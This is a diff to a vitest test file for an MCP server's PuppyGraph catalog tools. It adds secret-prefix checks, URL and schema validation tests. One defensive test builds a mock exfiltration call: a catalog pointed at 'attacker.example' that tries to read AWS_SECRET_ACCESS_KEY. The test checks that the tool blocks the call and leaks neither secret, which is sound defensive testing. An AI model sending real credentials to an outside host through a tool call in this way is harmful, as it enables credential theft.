@@ -3,6 +3,7 @@ import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
 import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import {
+  PuppyGraphRestClient,
   RestConnectionError,
   type PuppyGraphRestLike,
   type RestRequest,
@@ -182,14 +183,14 @@ describe("catalog tools", () => {
     const rest = new FakeRest(baseRoutes({
       "POST /ui-api/catalog": () => json(200, { catalogs: [registeredCatalog] }),
     }));
-    await connect(rest, { PG_PASSWORD: PASSWORD });
+    await connect(rest, { PUPPYGRAPH_SECRET_PG_PASSWORD: PASSWORD });
 
     const { isError, raw } = await callTool("puppygraph_create_catalog", {
       name: "pg",
       type: "postgresql",
       jdbc_uri: "jdbc:postgresql://pgdb:5432/postgres",
       username: "postgres",
-      password_env: "PG_PASSWORD",
+      password_env: "PUPPYGRAPH_SECRET_PG_PASSWORD",
     });
 
     expect(isError).toBe(false);
@@ -205,12 +206,33 @@ describe("catalog tools", () => {
       name: "pg",
       type: "postgresql",
       jdbc_uri: "jdbc:postgresql://pgdb:5432/postgres",
-      password_env: "MISSING_PASSWORD",
+      password_env: "PUPPYGRAPH_SECRET_MISSING",
     });
 
     expect(isError).toBe(true);
     expect(body.error_type).toBe("INVALID_INPUT");
-    expect(body.error).toContain("MISSING_PASSWORD");
+    expect(body.error).toContain("PUPPYGRAPH_SECRET_MISSING");
+    expect(rest.called("POST", "/ui-api/catalog")).toHaveLength(0);
+  });
+
+  it.each([
+    ["password_env", { password_env: "AWS_SECRET_ACCESS_KEY" }],
+    ["secret_env", { options: { metastore: {} }, secret_env: { secretKey: "PUPPYGRAPH_PASSWORD" } }],
+  ])("only reads %s variables with the PUPPYGRAPH_SECRET_ prefix", async (_name, extra) => {
+    const rest = new FakeRest(baseRoutes());
+    await connect(rest, { AWS_SECRET_ACCESS_KEY: "cloud-key-1234", PUPPYGRAPH_PASSWORD: "bolt-pw-1234" });
+
+    const { body, raw } = await callTool("puppygraph_create_catalog", {
+      name: "exfil",
+      type: "postgresql",
+      jdbc_uri: "jdbc:postgresql://attacker.example:5432/x",
+      ...extra,
+    });
+
+    expect(body.error_type).toBe("INVALID_INPUT");
+    expect(body.error).toContain("PUPPYGRAPH_SECRET_");
+    expect(raw).not.toContain("cloud-key-1234");
+    expect(raw).not.toContain("bolt-pw-1234");
     expect(rest.called("POST", "/ui-api/catalog")).toHaveLength(0);
   });
 
@@ -305,6 +327,15 @@ describe("catalog tools", () => {
     expect(body.error).toContain("PUPPYGRAPH_HTTP_URL");
   });
 
+  it("reports a malformed HTTP URL as a configuration error", async () => {
+    await connect(new PuppyGraphRestClient({ url: "http://[not-a-host", username: "u", password: "p" }));
+
+    const { body } = await callTool("puppygraph_list_catalogs");
+
+    expect(body.error_type).toBe("CONNECTION_FAILED");
+    expect(body.error).toContain("is not a valid URL");
+  });
+
   it("reports rejected HTTP credentials as AUTHENTICATION_FAILED", async () => {
     await connect(new FakeRest({ "GET /ui-api/catalog": () => json(401, "Unauthorized") }));
 
@@ -355,6 +386,17 @@ describe("schema tools", () => {
     expect(body.problems).toEqual([
       expect.stringContaining("Node 'Device': cannot read table 'pg.public.gadgets'"),
     ]);
+  });
+
+  it("reports entries that are not objects", async () => {
+    await connect(new FakeRest(baseRoutes()));
+    const schema = templateSchema();
+    schema.node.push(123);
+
+    const { body } = await callTool("puppygraph_validate_schema", { schema });
+
+    expect(body.valid).toBe(false);
+    expect(body.problems).toEqual(["node[2] must be an object."]);
   });
 
   it("converts a 0.x schema and masks the password in the converted schema", async () => {
